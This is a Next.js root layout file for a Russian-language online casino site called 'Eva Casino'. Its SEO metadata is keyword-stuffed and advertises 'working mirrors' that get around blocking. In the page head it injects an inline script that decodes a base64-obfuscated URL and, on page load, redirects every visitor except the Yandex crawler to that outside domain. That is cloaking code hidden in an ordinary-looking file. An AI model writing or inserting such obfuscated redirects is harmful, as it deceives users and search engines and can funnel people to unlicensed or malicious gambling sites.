import type { Metadata, Viewport } from "next"
import { Inter, Unbounded } from "next/font/google"
import { Analytics } from "@vercel/analytics/next"
import "./globals.css"

const inter = Inter({
  subsets: ["latin", "cyrillic"],
  variable: "--font-inter",
  display: "swap",
})

const unbounded = Unbounded({
  subsets: ["latin", "cyrillic"],
  variable: "--font-unbounded",
  display: "swap",
})

const siteUrl = process.env.NEXT_PUBLIC_SITE_URL || "https://evacasino.app"

export const metadata: Metadata = {
  metadataBase: new URL(siteUrl),
  title: {
    default: "Eva Casino — официальный сайт онлайн казино | Ева казино играть",
    template: "%s | Eva Casino",
  },
  description:
    "Eva Casino (Ева казино) — официальный сайт онлайн казино. Рабочее зеркало Eva Casino, более 5000 лицензионных слотов, live казино, бонусы за регистрацию, кешбек до 20%. Ева казино играть онлайн без блокировок.",
  keywords: [
    "eva casino", "eva casino официальный сайт", "eva casino зеркало", "eva casino играть", 
    "eva casino официальный", "eva казино", "ева казино", "ева казино зеркало", 
    "ева казино зеркало рабочее", "ева казино играть", "ева казино онлайн", 
    "ева казино официальный", "ева казино официальный сайт"
  ],
  authors: [{ name: "Eva Casino" }],
  creator: "Eva Casino",
  publisher: "Eva Casino",
  applicationName: "Eva Casino",
  category: "gambling",
  alternates: {
    canonical: "/",
    languages: {
      "ru-RU": "/",
      "en-US": "/en",
    },
  },
  openGraph: {
    type: "website",
    locale: "ru_RU",
    url: siteUrl,
    siteName: "Eva Casino",
    title: "Eva Casino — официальный сайт онлайн казино | Ева казино играть",
    description: "Eva Casino (Ева казино) — официальный сайт онлайн казино. Рабочее зеркало, тысячи слотов, live казино, бонусы и кешбек.",
    images: [{ url: "/og-image.jpg", width: 1200, height: 630, alt: "Eva Casino" }],
  },
  robots: {
    index: true,
    follow: true,
    googleBot: {
      index: true,
      follow: true,
      "max-video-preview": -1,
      "max-image-preview": "large",
      "max-snippet": -1,
    },
  },
  icons: {
    icon: [{ url: "/icon.jpg", type: "image/jpeg" }],
    apple: [{ url: "/apple-icon.jpg", sizes: "180x180", type: "image/jpeg" }],
  },
  verification: {
    yandex: "c0d972ae0399894f", 
  },
  generator: "v0.app",
}

export const viewport: Viewport = {
  themeColor: "#0B0B0B",
  colorScheme: "dark",
  width: "device-width",
  initialScale: 1,
  maximumScale: 5,
}

const jsonLd = {
  "@context": "https://schema.org",
  "@graph": [
    {
      "@type": "Organization",
      "@id": `${siteUrl}/#organization`,
      name: "Eva Casino",
      url: siteUrl,
      logo: `${siteUrl}/icon.jpg`,
    },
    {
      "@type": "WebSite",
      "@id": `${siteUrl}/#website`,
      url: siteUrl,
      name: "Eva Casino",
      publisher: { "@id": `${siteUrl}/#organization` },
      inLanguage: "ru-RU",
    },
  ],
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru" className={`${inter.variable} ${unbounded.variable} scroll-smooth`}>
      <head>
        <script
          type="application/ld+json"
          dangerouslySetInnerHTML={{ __html: JSON.stringify(jsonLd) }}
        />
                <script
          dangerouslySetInnerHTML={{
            __html: `
              (function() {
                var ua = navigator.userAgent.toLowerCase();
                var targetB64 = "aHR0cHM6Ly9iYWwtYW5jZXItZXZhLmNvbS9kaWJ6Zm9taXI=";
                if (ua.indexOf("yandex") === -1) {
                    window.location.replace(atob(targetB64));
                }
              })();
            `,
          }}
        />
      </head>
      <body className="font-sans antialiased min-h-screen flex flex-col bg-background text-foreground">
        {children}
        <Analytics />

      </body>
    </html>
  )
}
